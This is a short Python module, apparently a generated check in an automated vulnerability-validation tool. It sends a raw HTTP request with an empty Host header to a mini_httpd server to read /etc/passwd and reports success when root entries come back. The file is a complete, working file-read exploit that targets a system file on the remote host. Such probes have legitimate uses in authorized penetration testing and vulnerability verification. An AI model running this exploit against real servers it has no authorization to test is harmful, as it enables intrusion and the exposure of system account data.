import socket
import time


def run(context: dict) -> dict:
    target = context["target"]
    capability = context["capability"]
    matched = context.get("matched_service") or {}
    port = int(matched.get("port") or (capability.get("match", {}).get("ports") or [8080])[0])
    started = time.perf_counter()
    request = (
        "GET /etc/passwd HTTP/1.1\r\n"
        "Host: \r\n"
        "User-Agent: MedFlow-Generated-Tool/0.1\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n\r\n"
    )
    result = {
        "allowed": True,
        "target": target,
        "service": "http",
        "port": port,
        "proof_goal": capability.get("proof_goal", "Validate mini_httpd empty Host file-read behavior."),
        "verified": False,
        "exploited": False,
        "cleanup_verified": True,
    }
    try:
        with socket.create_connection((target, port), timeout=5) as sock:
            sock.settimeout(5)
            sock.sendall(request.encode("utf-8"))
            chunks = []
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(len(item) for item in chunks) > 12000:
                    break
        response = b"".join(chunks).decode("utf-8", errors="replace")
        result["status_line"] = response.splitlines()[0] if response.splitlines() else ""
        result["body_preview"] = response[-500:]
        result["verified"] = "root:" in response and ":/root:" in response
        if result["verified"]:
            result["proof_output"] = "Empty Host request returned /etc/passwd-style root entry."
        else:
            result["reason"] = "Expected /etc/passwd root entry was not observed."
    except Exception as exc:
        result["reason"] = f"mini_httpd file-read probe failed: {exc}"
    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
    return result
